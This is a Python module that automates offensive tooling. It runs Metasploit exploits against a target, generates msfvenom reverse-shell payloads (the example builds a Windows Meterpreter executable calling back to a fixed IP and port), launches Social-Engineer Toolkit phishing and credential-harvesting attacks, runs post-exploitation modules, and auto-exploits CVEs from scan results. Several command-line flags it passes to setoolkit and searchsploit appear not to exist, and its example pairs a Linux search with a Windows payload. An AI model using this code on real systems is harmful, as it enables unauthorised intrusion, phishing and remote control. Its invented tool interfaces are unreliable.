#!/usr/bin/env python3
"""
Exploitation Tools Category

This module provides automation for exploitation and post-exploitation tools including:
- Metasploit Framework automation
- Social engineering toolkit (SET)
- Custom exploit development
- Payload generation and management
- Exploit database integration
- Post-exploitation modules
"""

import asyncio
import json
import logging
import os
import subprocess
import time
from dataclasses import dataclass
from enum import Enum
from typing import Any

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ExploitType(Enum):
    """Types of exploits."""
    REMOTE_EXPLOIT = "remote_exploit"
    LOCAL_EXPLOIT = "local_exploit"
    WEB_EXPLOIT = "web_exploit"
    SOCIAL_ENGINEERING = "social_engineering"
    PAYLOAD = "payload"
    POST_EXPLOITATION = "post_exploitation"


class PayloadType(Enum):
    """Types of payloads."""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    STAGED = "staged"
    SINGLE = "single"
    ENCODER = "encoder"


@dataclass
class ExploitModule:
    """Represents a Metasploit exploit module."""
    name: str
    full_name: str
    description: str
    rank: str
    disclosure_date: str
    author: str
    platform: str
    arch: str
    target: str
    payloads: list[str] = None


@dataclass
class ExploitResult:
    """Result of an exploitation attempt."""
    exploit_name: str
    target: str
    success: bool
    session_id: str = None
    details: dict[str, Any] = None
    timestamp: str = None
    duration: float = 0.0
    output: str = None
    error: str = None


class ExploitationTools:
    """Main class for exploitation tool automation."""

    def __init__(self, config: dict[str, Any] = None):
        """Initialize exploitation tools."""
        self.config = config or {}
        self.msf_path = self.config.get('msf_path', '/usr/share/metasploit-framework')
        self.msfconsole_path = self.config.get('msfconsole_path', 'msfconsole')
        self.set_path = self.config.get('set_path', '/usr/share/set')

        # Exploit database
        self.exploit_db_url = "https://raw.githubusercontent.com/offensive-security/exploitdb/master/files_exploits.csv"

        # Session management
        self.active_sessions: dict[str, dict[str, Any]] = {}
        self.exploit_history: list[ExploitResult] = []

        # Tool paths
        self.tools = {
            'msfconsole': self.msfconsole_path,
            'msfvenom': 'msfvenom',
            'msfdb': 'msfdb',
            'set': 'setoolkit',
            'searchsploit': 'searchsploit',
            'nmap': 'nmap',
            'sqlmap': 'sqlmap',
            'beef': 'beef-xss'
        }

        logger.info("Exploitation tools initialized")

    async def start_metasploit_database(self) -> bool:
        """Start Metasploit database service."""
        try:
            logger.info("Starting Metasploit database")

            # Start PostgreSQL
            result = await self._run_command(['systemctl', 'start', 'postgresql'])
            if not result['success']:
                logger.error("Failed to start PostgreSQL")
                return False

            # Initialize MSF database
            result = await self._run_command(['msfdb', 'init'])
            if not result['success']:
                logger.error("Failed to initialize MSF database")
                return False

            logger.info("Metasploit database started successfully")
            return True

        except Exception as e:
            logger.error(f"Error starting Metasploit database: {e}")
            return False

    async def search_exploits(self, query: str, platform: str = None,
                             type: str = None) -> list[ExploitModule]:
        """Search for exploits using searchsploit."""
        try:
            logger.info(f"Searching for exploits: {query}")

            cmd = ['searchsploit', '--json', query]
            if platform:
                cmd.extend(['--platform', platform])
            if type:
                cmd.extend(['--type', type])

            result = await self._run_command(cmd)

            if result['success']:
                exploits = self._parse_searchsploit_output(result['output'])
                logger.info(f"Found {len(exploits)} exploits")
                return exploits
            else:
                logger.error("Searchsploit search failed")
                return []

        except Exception as e:
            logger.error(f"Error searching exploits: {e}")
            return []

    def _parse_searchsploit_output(self, output: str) -> list[ExploitModule]:
        """Parse searchsploit JSON output."""
        exploits = []

        try:
            # Extract JSON from output
            json_start = output.find('[')
            json_end = output.rfind(']') + 1

            if json_start != -1 and json_end != -1:
                json_str = output[json_start:json_end]
                data = json.loads(json_str)

                for item in data:
                    exploit = ExploitModule(
                        name=item.get('title', ''),
                        full_name=item.get('path', ''),
                        description=item.get('description', ''),
                        rank='normal',
                        disclosure_date=item.get('date', ''),
                        author=item.get('author', ''),
                        platform=item.get('platform', ''),
                        arch='',
                        target='',
                        payloads=[]
                    )
                    exploits.append(exploit)

        except Exception as e:
            logger.error(f"Error parsing searchsploit output: {e}")

        return exploits

    async def run_exploit(self, exploit_path: str, target: str,
                          payload: str = None, options: dict[str, str] = None) -> ExploitResult:
        """Run a Metasploit exploit."""
        try:
            logger.info(f"Running exploit: {exploit_path} against {target}")
            start_time = time.time()

            # Build MSF command
            msf_script = self._build_msf_script(exploit_path, target, payload, options)
            script_file = f"/tmp/msf_script_{int(time.time())}.rc"

            with open(script_file, 'w') as f:
                f.write(msf_script)

            # Run MSF with script
            cmd = [self.msfconsole_path, '-r', script_file]
            result = await self._run_command(cmd)
            duration = time.time() - start_time

            # Parse results
            success = self._check_exploit_success(result['output'])
            session_id = self._extract_session_id(result['output'])

            exploit_result = ExploitResult(
                exploit_name=exploit_path,
                target=target,
                success=success,
                session_id=session_id,
                details={
                    'payload': payload,
                    'options': options,
                    'duration': duration
                },
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=duration,
                output=result['output'],
                error=result['error']
            )

            self.exploit_history.append(exploit_result)

            # Clean up
            os.remove(script_file)

            return exploit_result

        except Exception as e:
            logger.error(f"Error running exploit: {e}")
            return ExploitResult(
                exploit_name=exploit_path,
                target=target,
                success=False,
                details={'error': str(e)},
                timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
                duration=0,
                error=str(e)
            )

    def _build_msf_script(self, exploit_path: str, target: str,
                          payload: str = None, options: dict[str, str] = None) -> str:
        """Build Metasploit resource script."""
        script_lines = [
            f"use {exploit_path}",
            f"set RHOSTS {target}"
        ]

        if payload:
            script_lines.append(f"set PAYLOAD {payload}")

        if options:
            for key, value in options.items():
                script_lines.append(f"set {key} {value}")

        script_lines.extend([
            "exploit -j",
            "sessions -l"
        ])

        return "\n".join(script_lines)

    def _check_exploit_success(self, output: str) -> bool:
        """Check if exploit was successful."""
        success_indicators = [
            'Meterpreter session',
            'Command shell session',
            'Session established',
            'Exploit completed'
        ]

        return any(indicator in output for indicator in success_indicators)

    def _extract_session_id(self, output: str) -> str:
        """Extract session ID from MSF output."""
        try:
            # Look for session ID patterns
            import re
            session_pattern = r'Session (\d+)'
            match = re.search(session_pattern, output)
            if match:
                return match.group(1)
        except Exception:
            pass
        return None

    async def generate_payload(self, payload_type: str, lhost: str, lport: int,
                              format: str = 'raw', output_file: str = None) -> dict[str, Any]:
        """Generate payload using msfvenom."""
        try:
            logger.info(f"Generating {payload_type} payload")

            cmd = [
                'msfvenom',
                '-p', payload_type,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', format
            ]

            if output_file:
                cmd.extend(['-o', output_file])

            result = await self._run_command(cmd)

            if result['success']:
                return {
                    'success': True,
                    'payload': result['output'],
                    'output_file': output_file
                }
            else:
                return {
                    'success': False,
                    'error': result['error']
                }

        except Exception as e:
            logger.error(f"Error generating payload: {e}")
            return {
                'success': False,
                'error': str(e)
            }

    async def run_social_engineering_attack(self, attack_type: str,
                                          target_info: dict[str, Any]) -> dict[str, Any]:
        """Run social engineering attack using SET."""
        try:
            logger.info(f"Starting social engineering attack: {attack_type}")

            # SET attack types
            set_attacks = {
                'phishing': '1',
                'spear_phishing': '2',
                'website_cloning': '3',
                'credential_harvester': '4',
                'tabnabbing': '5',
                'web_jacking': '6',
                'multi_attack': '7'
            }

            if attack_type not in set_attacks:
                raise ValueError(f"Unsupported attack type: {attack_type}")

            # Build SET command
            set_cmd = [
                'setoolkit',
                '--attack', set_attacks[attack_type],
                '--target', target_info.get('target', ''),
                '--payload', target_info.get('payload', 'windows/meterpreter/reverse_tcp')
            ]

            result = await self._run_command(set_cmd)

            return {
                'success': result['success'],
                'attack_type': attack_type,
                'output': result['output'],
                'error': result['error']
            }

        except Exception as e:
            logger.error(f"Error running social engineering attack: {e}")
            return {
                'success': False,
                'error': str(e)
            }

    async def run_post_exploitation(self, session_id: str,
                                   modules: list[str]) -> dict[str, Any]:
        """Run post-exploitation modules."""
        try:
            logger.info(f"Running post-exploitation modules on session {session_id}")

            results = {}

            for module in modules:
                logger.info(f"Running module: {module}")

                # Build MSF script for post-exploitation
                script = f"""
use {module}
set SESSION {session_id}
run
"""

                script_file = f"/tmp/post_exploit_{int(time.time())}.rc"
                with open(script_file, 'w') as f:
                    f.write(script)

                # Run module
                cmd = [self.msfconsole_path, '-r', script_file]
                result = await self._run_command(cmd)

                results[module] = {
                    'success': result['success'],
                    'output': result['output'],
                    'error': result['error']
                }

                # Clean up
                os.remove(script_file)

            return {
                'success': True,
                'session_id': session_id,
                'results': results
            }

        except Exception as e:
            logger.error(f"Error running post-exploitation: {e}")
            return {
                'success': False,
                'error': str(e)
            }

    async def get_exploit_database_info(self, cve_id: str = None) -> dict[str, Any]:
        """Get information from Exploit Database."""
        try:
            if cve_id:
                logger.info(f"Searching Exploit Database for CVE: {cve_id}")
                cmd = ['searchsploit', '--cve', cve_id]
            else:
                logger.info("Getting Exploit Database statistics")
                cmd = ['searchsploit', '--stats']

            result = await self._run_command(cmd)

            if result['success']:
                return {
                    'success': True,
                    'data': result['output']
                }
            else:
                return {
                    'success': False,
                    'error': result['error']
                }

        except Exception as e:
            logger.error(f"Error accessing Exploit Database: {e}")
            return {
                'success': False,
                'error': str(e)
            }

    async def run_automated_exploitation(self, target: str,
                                       vulnerability_scan: dict[str, Any]) -> list[ExploitResult]:
        """Run automated exploitation based on vulnerability scan results."""
        try:
            logger.info(f"Starting automated exploitation for {target}")

            results = []

            # Process each vulnerability
            for vuln in vulnerability_scan.get('vulnerabilities', []):
                cve_id = vuln.get('cve_id')
                if cve_id:
                    # Search for exploits
                    exploits = await self.search_exploits(cve_id)

                    if exploits:
                        # Try the first available exploit
                        exploit = exploits[0]
                        result = await self.run_exploit(
                            exploit.full_name,
                            target,
                            options={'VERBOSE': 'true'}
                        )
                        results.append(result)

                        if result.success:
                            logger.info(f"Successfully exploited {cve_id}")
                            break

            return results

        except Exception as e:
            logger.error(f"Error in automated exploitation: {e}")
            return []

    async def _run_command(self, cmd: list[str]) -> dict[str, Any]:
        """Run a command and return results."""
        try:
            logger.debug(f"Running command: {' '.join(cmd)}")

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            return {
                'success': process.returncode == 0,
                'output': stdout.decode('utf-8', errors='ignore'),
                'error': stderr.decode('utf-8', errors='ignore'),
                'return_code': process.returncode
            }

        except Exception as e:
            logger.error(f"Error running command {' '.join(cmd)}: {e}")
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }

    def get_exploit_history(self) -> list[ExploitResult]:
        """Get history of all exploitation attempts."""
        return self.exploit_history

    def get_active_sessions(self) -> dict[str, dict[str, Any]]:
        """Get currently active sessions."""
        return self.active_sessions

    def cleanup(self):
        """Clean up resources."""
        try:
            # Kill any remaining MSF processes
            subprocess.run(['pkill', '-f', 'msfconsole'], check=False, capture_output=True)
            subprocess.run(['pkill', '-f', 'setoolkit'], check=False, capture_output=True)

            logger.info("Exploitation tools cleanup completed")

        except Exception as e:
            logger.error(f"Error during cleanup: {e}")


# Example usage and testing
async def main():
    """Example usage of exploitation tools."""
    tools = ExploitationTools()

    try:
        # Start MSF database
        if await tools.start_metasploit_database():
            # Search for exploits
            exploits = await tools.search_exploits("apache", "linux")
            print(f"Found {len(exploits)} Apache exploits")

            if exploits:
                # Generate payload
                payload_result = await tools.generate_payload(
                    "windows/meterpreter/reverse_tcp",
                    "192.168.1.100",
                    4444,
                    "exe"
                )

                if payload_result['success']:
                    print("Payload generated successfully")

                # Run social engineering attack
                set_result = await tools.run_social_engineering_attack(
                    "phishing",
                    {"target": "example.com", "payload": "windows/meterpreter/reverse_tcp"}
                )

                print(f"SET attack result: {set_result['success']}")

    finally:
        tools.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
